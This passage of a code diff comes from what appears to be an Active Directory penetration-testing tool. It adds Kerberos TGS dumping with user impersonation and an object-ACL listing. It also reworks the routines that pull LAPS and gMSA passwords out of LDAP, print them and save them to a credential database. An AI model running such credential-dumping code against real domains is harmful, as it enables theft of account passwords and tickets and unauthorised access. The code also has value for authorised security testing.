+                    def callback(entry):
+                        if len(entry['rights']) > 0:
+                            if 'parameter' in entry:
+                                parameter = entry['parameter'] if 'parameter' in entry else entry['guid']
+                                Output.write({'target': ldapscan.url(), 'message': '- (%s) %s ->   %s   [%s] %s:%s' % (entry['type'], entry['name'].ljust(30), entry['target'].ljust(30), ','.join(entry['rights']), parameter['type'], parameter['name'])})
+                            elif 'guid' in entry:
+                                Output.write({'target': ldapscan.url(), 'message': '- (%s) %s ->   %s   [%s] guid:%s' % (entry['type'], entry['name'].ljust(30), entry['target'].ljust(30), ','.join(entry['rights']), entry['guid'])})
+                            else:
+                                Output.write({'target': ldapscan.url(), 'message': '- (%s) %s ->   %s   [%s]' % (entry['type'], entry['name'].ljust(30), entry['target'].ljust(30), ','.join(entry['rights']))})
+
+
+                    ldapscan.list_object_acl(actions['object_acl']['object'], callback, all=all)
 
             if 'gettgt' in actions:
                 Output.highlight({'target': smbscan.url(), 'message': 'Dumping the TGT of the current user...'})
                 smbscan.gettgt()
+
+            if 'gettgs' in actions:
+                spn = actions['gettgs']['spn']
+                if 'impersonate' in actions['gettgs']:
+                    impersonate = actions['gettgs']['impersonate']
+                else:
+                    impersonate = None
+                Output.highlight({'target': smbscan.url(), 'message': 'Dumping the TGS of the SPN %s...' % spn})
+                smbscan.gettgs(spn, impersonate)
 
             if 'users_brute' in actions:
                 # Technically only needs kerberos but well....
@@ -501,7 +995,7 @@ def adscan_worker(target, actions, creds, timeout):
                 if ldap_authenticated:
                     if ldapscan.ssl:
                         Output.highlight({'target': smbscan.url(), 'message': 'gMSA entries:'})
-                        for entry in ldapscan.dump_gMSA():
+                        def callback(entry):
                             user = '%s\\%s' % (entry['domain'], entry['username'])
                             Output.write({'target': ldapscan.url(), 'message': '- %s   %s' % (user.ljust(40), entry['password'])})
 
@@ -512,22 +1006,27 @@ def adscan_worker(target, actions, creds, timeout):
                                 'password': entry['password'],
                             }
                             DB.insert_domain_credential(cred_info)
+                        ldapscan.dump_gMSA(callback)
                     else:
                         Output.error({'target': ldapscan.url(), 'message': '--gmsa requires to connect to LDAP using SSL, it is probably not available here :('})
             if 'dump_laps' in actions:
                 if ldap_authenticated:
                     Output.highlight({'target': smbscan.url(), 'message': 'LAPS entries:'})
-                    for entry in ldapscan.dump_LAPS():
+                    def callback(entry):
                         user = '%s\\%s' % (entry['domain'], entry['username'])
-                        Output.write({'target': ldapscan.url(), 'message': '- %s   %s   %s' % (user.ljust(40), entry['dns'].ljust(40), entry['password'])})
+                        if 'password' in entry:
+                            Output.write({'target': ldapscan.url(), 'message': '- %s   %s   %s' % (user.ljust(40), entry['dns'].ljust(40), entry['password'])})
 
-                        cred_info = {
-                            'domain': entry['domain'],
-                            'username': entry['username'],
-                            'type': 'password',
-                            'password': entry['password'],
-                        }
-                        DB.insert_domain_credential(cred_info)
+                            cred_info = {
+                                'domain': entry['domain'],
+                                'username': entry['username'],
+                                'type': 'password',
+                                'password': entry['password'],
+                            }
+                            DB.insert_domain_credential(cred_info)
+                        else:
+                            Output.write({'target': ldapscan.url(), 'message': '- %s   %s   Unable to retreive password, unsufficient rights' % (user.ljust(40), entry['dns'].ljust(40))})
+                    ldapscan.dump_LAPS(callback)
             if 'dump_ntds' in actions:
                 if smb_authenticated:
                     try:
